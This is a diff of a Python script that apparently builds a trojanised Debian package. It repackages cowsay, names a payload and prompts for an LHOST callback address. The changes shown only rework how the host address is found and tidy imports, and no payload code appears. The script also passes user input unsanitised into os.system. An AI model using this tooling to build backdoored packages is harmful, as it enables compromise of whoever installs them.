@@ -5,6 +5,7 @@
 ######################################
 
 import sys
+import subprocess
 import signal
 import os
 
@@ -34,7 +35,6 @@ def cowsay_installation():
     os.system(f"dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-8_all.deb ~/cowsay")
 
 def build_package(payload_name, default_path):
-    user = os.system("whoami")
     os.system(f"mkdir {default_path} && touch {payload_name}")
 
     os.system(f"mkdir {default_path}DEBIAN && cd {default_path}/DEBIAN")
@@ -115,8 +115,11 @@ def main():
         LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")
 
         if LHOST == "":
-            LHOST = os.system("hostname -i | awk '{print $2}'")
-        print(LHOST)
+            command = "hostname -i | awk '{print $2}'"
+            LHOST = os.system(f"echo $({command}) > test.txt")
+        
+        with open("test.txt", "r") as file:
+            LHOST = file.read().strip("\n")
 
         banner()
         cowsay_installation()
